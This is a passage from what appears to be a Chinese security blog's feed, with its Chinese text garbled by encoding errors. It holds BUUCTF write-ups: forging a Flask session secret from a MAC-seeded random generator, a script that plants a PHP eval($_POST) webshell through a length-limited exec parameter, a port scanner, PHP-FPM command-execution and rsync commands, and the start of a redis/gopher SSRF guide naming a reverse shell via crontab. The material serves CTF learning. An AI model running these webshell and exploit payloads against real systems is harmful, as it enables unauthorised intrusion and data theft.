href="https://www.cnblogs.com/DswCnblog/p/5780389.html" target="_blank" rel="noopener">https://www.cnblogs.com/DswCnblog/p/5780389.html</a></p><p>è¯»å–/proc/self/environ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">HOSTNAME&#x3D;04c86f855cc2</span><br><span class="line">SHLVL&#x3D;1</span><br><span class="line">PYTHON_PIP_VERSION&#x3D;19.1.1</span><br><span class="line">HOME&#x3D;&#x2F;root</span><br><span class="line">GPG_KEY&#x3D;0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D</span><br><span class="line">UWSGI_INI&#x3D;&#x2F;app&#x2F;uwsgi.ini</span><br><span class="line">WERKZEUG_SERVER_FD&#x3D;3</span><br><span class="line">NGINX_MAX_UPLOAD&#x3D;0UWSGI_PROCESSES&#x3D;16</span><br><span class="line">STATIC_URL&#x3D;&#x2F;static_&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python</span><br><span class="line">UWSGI_CHEAPER&#x3D;2</span><br><span class="line">WERKZEUG_RUN_MAIN&#x3D;true</span><br><span class="line">NGINX_VERSION&#x3D;1.15.81~</span><br><span class="line">stretchPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line">NJS_VERSION&#x3D;1.15.8.0.2.7-1~</span><br><span class="line">stretchLANG&#x3D;C.UTF8</span><br><span class="line">PYTHON_VERSION&#x3D;3.6.8</span><br><span class="line">NGINX_WORKER_PROCESSES&#x3D;1</span><br><span class="line">LISTEN_PORT&#x3D;80</span><br><span class="line">STATIC_INDEX&#x3D;0</span><br><span class="line">PWD&#x3D;&#x2F;app</span><br><span class="line">PYTHONPATH&#x3D;&#x2F;app</span><br><span class="line">STATIC_PATH&#x3D;&#x2F;app&#x2F;staticF</span><br><span class="line">LAG&#x3D;not_flag</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„åˆ°æœ‰<code>/app/uwsgi.ini</code>æ–‡ä»¶ï¼Œè¯»å–ä¸€ä¸‹å†…å®¹</p><img src="/2020/07/22/HCTF-2018-Hideandseek/6.png" class=""><p>è¿™é‡Œå¥½åƒæœ‰ç‚¹å°é—®é¢˜ï¼Œ/app/main.pyå¹¶ä¸èƒ½è¯»åˆ°æºç ï¼Œçœ‹wpï¼Œåº”è¯¥æ˜¯buuç¯å¢ƒé—®é¢˜ï¼ŒåŸé¢˜çš„æ–‡ä»¶è·¯å¾„è¿˜æ˜¯èƒ½å¤Ÿè®¿é—®å¹¶è¯»å–æ–‡ä»¶çš„ï¼Œè·¯å¾„ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;app&#x2F;hard_t0_guess_n9f5a95b5ku9fg&#x2F;hard_t0_guess_also_df45v48ytj9_main.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">        session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username=request.form[<span class="string">'username'</span>]</span><br><span class="line">    password=request.form[<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure><p>ä»ä»£ç ä¸­æ‰¾åˆ°å…³é”®ç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br></pre></td></tr></table></figure><p>è¿™ä¸€è¡Œä»£ç å¾ˆçœ¼ç†Ÿï¼ŒåŸæ¥ç§å­ç”¨çš„æ˜¯macåœ°å€ï¼Œåœ¨<code>/sys/class/net/eth0/address</code>ä¸‹å°±èƒ½çœ‹åˆ°</p><img src="/2020/07/22/HCTF-2018-Hideandseek/7.png" class=""><p>ç”Ÿæˆä¸€ä¸‹secret</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">"02:42:ae:02:67:f4"</span></span><br><span class="line">temp = mac.split(<span class="string">':'</span>)</span><br><span class="line">temp = [int(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = [bin(i).replace(<span class="string">'0b'</span>,<span class="string">''</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = <span class="string">''</span>.join(temp)</span><br><span class="line">mac = int(temp,<span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = str(random.random()*<span class="number">100</span>)</span><br><span class="line">print(randStr)</span><br><span class="line"><span class="comment">#53.15748623365909</span></span><br></pre></td></tr></table></figure><img src="/2020/07/22/HCTF-2018-Hideandseek/9.png" class=""><p>ç„¶åæ›¿æ¢ä¸€ä¸‹adminçš„cookieï¼Œå°±å¯ä»¥äº†</p><img src="/2020/07/22/HCTF-2018-Hideandseek/8.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘åšçš„é¢˜å‘ç°å¯¹äºlinuxæ•´ä¸ªç³»ç»Ÿæ¶æ„çš„è¦æ±‚æ¯”è¾ƒé«˜ï¼Œå¾—æŠ½æ—¶é—´å¥½å¥½å­¦ä¹ ä¸€ä¸‹äº†
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>ctf473831530_2018_web_virink_web</title>
    <link href="http://yoursite.com/2020/07/22/ctf473831530-2018-web-virink-web/"/>
    <id>http://yoursite.com/2020/07/22/ctf473831530-2018-web-virink-web/</id>
    <published>2020-07-22T08:01:28.000Z</published>
    <updated>2020-07-22T08:33:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>é‡æ–°å¼€å§‹åˆ·é¢˜çš„ç¬¬ä¸€é“ï¼Œå¥½æ´»ï¼Œå¥½å¥½æ•´ï¼<a id="more"></a></p><p>å¼€é¢˜é€æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">'orange'</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">20</span>) &#123;</span><br><span class="line">        exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br /&gt; IP : &#123;\$_SERVER['REMOTE_ADDR']&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/07/22/ctf473831530-2018-web-virink-web/1.png" class=""><p>æ–‡ä»¶å­˜å‚¨è·¯å¾„å°±æ˜¯md5(orange.ip)</p><p>ä»æºç ä¸­å¯ä»¥çœ‹å‡ºè¦å†™é•¿åº¦&lt;20çš„shellï¼Œå‚è€ƒæ–‡ç« <a href="https://blog.csdn.net/iamsongyu/article/details/84483638" target="_blank" rel="noopener">https://blog.csdn.net/iamsongyu/article/details/84483638</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://273d5199-9497-4159-9388-3c9e34f963f4.node3.buuoj.cn/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">filename = [<span class="string">r'&gt;echo\ \\'</span>,</span><br><span class="line">            <span class="string">r"&gt;\'\&lt;\?php \\"</span>,</span><br><span class="line">            <span class="string">r'&gt;eval\('</span>,</span><br><span class="line">            <span class="string">r'&gt;\$_POST\[c\]\)'</span>,</span><br><span class="line">            <span class="string">r"&gt;\;\'\&gt;2.php"</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> filename:</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'cmd'</span>: i</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url, params=params)</span><br><span class="line">    print(i, r.status_code)</span><br><span class="line"></span><br><span class="line">cmd = [<span class="string">'ls -tr&gt;1.sh'</span>, <span class="string">'sh 1.sh'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'cmd'</span>: i</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url, params=params)</span><br><span class="line">    print(i, r.status_code)</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸Šé¢çš„è„šæœ¬å†™å…¥shellï¼Œè®¿é—®sandbox/xxx/2.phpå³å¯ï¼Œè¿™é‡Œç”¨èšå‰‘è¿ä¸Šï¼Œçœ‹ä¸€ä¸‹ä¸»æœºä¿¡æ¯</p><img src="/2020/07/22/ctf473831530-2018-web-virink-web/2.png" class=""><p>ä¸‹é¢è¦è¿›è¡Œå†…ç½‘æ‰«æï¼Œæç¤ºå¯ä»¥ç”¨python3ï¼Œç”¨æ‰«æè„šæœ¬å³å¯ã€‚è¿™é‡Œæ ¹æ®buuä¸‹ä¸€ä¸ªipåœ°å€æ˜¯å†…ç½‘ï¼Œæ¨æµ‹å†…ç½‘ipä¸º173.202.77.11</p><p>æ‰«æå¼€æ”¾ç«¯å£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'active_port.txt'</span>,<span class="string">'at'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">80</span>,<span class="number">65535</span>+<span class="number">1</span>):</span><br><span class="line">            ip = <span class="string">'173.202.77.11'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip,i))</span><br><span class="line">                s.close()</span><br><span class="line">                f.writelines(str(i)+<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    foo()</span><br><span class="line">    print(<span class="string">'ok'</span>)</span><br></pre></td></tr></table></figure><p>æ‰«å‡ºæœ‰ä¸‰ä¸ªå¼€æ”¾ç«¯å£åˆ†åˆ«æ˜¯80ï¼Œ873ï¼Œ9000ç«¯å£</p><p>è¿™é‡Œè¦ç”¨åˆ°pç¥çš„æ–‡ç« </p><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p>æ ¹æ®æ–‡ç« æè¿°ï¼ŒPHP-FPMé»˜è®¤ç›‘å¬9000ç«¯å£ï¼Œå¦‚æœè¿™ä¸ªç«¯å£æš´éœ²åœ¨å…¬ç½‘ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ fastcgiåè®®ï¼Œå’Œfpmè¿›è¡Œé€šä¿¡ï¼Œç›´æ¥ç”¨pç¥çš„expï¼Œæ–‡ç« ä¸­æœ‰ä¸‹è½½é“¾æ¥ï¼ŒæŠŠexpä¸Šä¼ åˆ°è·¯å¾„ä¸‹</p><p>è¿™é‡Œè¿˜è¦æ³¨æ„80ç«¯å£å¼€æ”¾ï¼Œæœ‰ä¸€ä¸ªredirect.phpæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fpm.py 173.202.77.11 &#x2F;www&#x2F;redirect.php -c \&quot;&lt;?php system(&#39;ls &#x2F; -all&#39;);?&gt;\&quot;</span><br></pre></td></tr></table></figure><img src="/2020/07/22/ctf473831530-2018-web-virink-web/3.png" class=""><p>å¯ä»¥çœ‹åˆ°flagæ–‡ä»¶æ²¡æœ‰æƒé™è¯»å–</p><p>çœ‹å…¬å¼€çš„wpè¯´æ˜¯è¦ç”¨åˆ°873ç«¯å£çš„rsyncæœªæˆæƒè®¿é—®</p><p><a href="https://www.cnblogs.com/leixiao-/p/10227086.html" target="_blank" rel="noopener">https://www.cnblogs.com/leixiao-/p/10227086.html</a></p><p>å…ˆè¯»å–ä¸€ä¸‹rsyncçš„é…ç½®æ–‡ä»¶</p><img src="/2020/07/22/ctf473831530-2018-web-virink-web/4.png" class=""><p>é…ç½®ä¸­å®šä¹‰äº†srcæ¨¡å—å¹¶ä¸”è·¯å¾„æŒ‡å‘äº†æ ¹ç›®å½•ï¼Œèƒ½å¤Ÿè¯»å–æ–‡ä»¶å†…å®¹ï¼Œä¸‹é¢ç”¨åšå®¢é‡Œçš„æ–¹æ³•æœ¬åˆ†å‡ºflagæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fpm.py 173.202.77.11 &#x2F;www&#x2F;redirect.php -c \&quot;&lt;?php system(&#39;rsync 127.0.0.1::src&#x2F;7h1s_i5_f14g &#x2F;tmp&#x2F;&#39;);?&gt;\&quot;</span><br></pre></td></tr></table></figure><p>ä¹‹åå°±èƒ½åˆ°tmpè·¯å¾„ä¸‹è¯»å–flagäº†</p><img src="/2020/07/22/ctf473831530-2018-web-virink-web/5.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;é‡æ–°å¼€å§‹åˆ·é¢˜çš„ç¬¬ä¸€é“ï¼Œå¥½æ´»ï¼Œå¥½å¥½æ•´ï¼
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>redisé…ç½®åŠSSRFåˆ©ç”¨</title>
    <link href="http://yoursite.com/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/</id>
    <published>2020-07-16T07:12:53.000Z</published>
    <updated>2020-07-16T11:27:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜¨å¤©åšäº†ç½‘é¼æ¯ç„æ­¦ç»„çš„SSRFMEé‚£é“é¢˜ï¼Œå¯¹äºredisçš„åˆ©ç”¨ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œä»Šå¤©æ­ä¸€ä¸‹ç¯å¢ƒæŠŠèƒ½åˆ©ç”¨çš„æ–¹å¼èƒ½è¿‡ä¸€é<a id="more"></a></p><h3 id="å®‰è£…åŠé…ç½®"><a href="#å®‰è£…åŠé…ç½®" class="headerlink" title="å®‰è£…åŠé…ç½®"></a>å®‰è£…åŠé…ç½®</h3><p>ç¬¬ä¸€æ­¥ï¼šè¿›å…¥åˆ°/home/dataç›®å½•ä¸‹</p><p>ç¬¬äºŒæ­¥ï¼š wget <a href="http://download.redis.io/releases/redis-3.2.6.tar.gz" target="_blank" rel="noopener">http://download.redis.io/releases/redis-3.2.6.tar.gz</a>  å®‰è£…å‹ç¼©åŒ…</p><p>ç¬¬ä¸‰æ­¥ï¼šè§£å‹ tar -zxvf redis-3.2.6.tar.gz</p><p>ç¬¬å››æ­¥ï¼šç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œç¯å¢ƒï¼ˆæ²¡æœ‰gccä¼šæŠ¥é”™ï¼Œå®‰è£…ä¸€ä¸‹gccï¼Œå…¶ä»–æŠ¥é”™å¯å¿½ç•¥ï¼‰</p><p>ç¬¬äº”æ­¥ï¼šæ‹·è´redis-cli ã€ redis-server åˆ° /usr/local/redis/ç›®å½•ï¼Œå†å›åˆ°redis-2.6.14 æºç ç›®å½• å°†redis.conf æ–‡ä»¶å¤åˆ¶åˆ° redis ç›®å½•ä¸‹</p><p>ç¬¬å…­æ­¥ï¼šä¿®æ”¹redis.confé…ç½®ä¿¡æ¯ï¼Œdaemonize noï¼Œnoæ”¹ä¸ºyesï¼Œprotected=mode yesæ”¹æˆnoï¼Œbind 127.0.0.1æ³¨é‡Šæ‰ï¼Œå…·ä½“ä½œç”¨åœ¨é…ç½®ä¿¡æ¯çš„æ³¨é‡Šä¿¡æ¯ä¸­éƒ½æœ‰</p><p>å¼€å¯redisæœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;redis-server redis.conf</span><br></pre></td></tr></table></figure><p>å†ç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pstree</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰redisæœåŠ¡åœ¨è¿è¡Œ</p><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/1.png" class=""><h3 id="REDISé…åˆgopheråè®®è¿›è¡ŒSSRF"><a href="#REDISé…åˆgopheråè®®è¿›è¡ŒSSRF" class="headerlink" title="REDISé…åˆgopheråè®®è¿›è¡ŒSSRF"></a>REDISé…åˆgopheråè®®è¿›è¡ŒSSRF</h3><h4 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h4><p>gopheråè®®å¯ä»¥æ”»å‡»å†…ç½‘çš„ redisã€ftpç­‰ç­‰ï¼Œä¹Ÿå¯ä»¥å‘é€ GETã€POST è¯·æ±‚</p><h4 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">èƒ½æœªæˆæƒæˆ–è€…èƒ½é€šè¿‡å¼±å£ä»¤è®¤è¯è®¿é—®åˆ°RedisæœåŠ¡å™¨</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p>1.ç»å¯¹è·¯å¾„å†™shell</p><p>2.å†™sshå…¬é’¥</p><p>3.å†™contrabè®¡åˆ’ä»»åŠ¡åå¼¹shell</p><h4 id="ç»å¯¹è·¯å¾„å†™shell"><a href="#ç»å¯¹è·¯å¾„å†™shell" class="headerlink" title="ç»å¯¹è·¯å¾„å†™shell"></a>ç»å¯¹è·¯å¾„å†™shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir 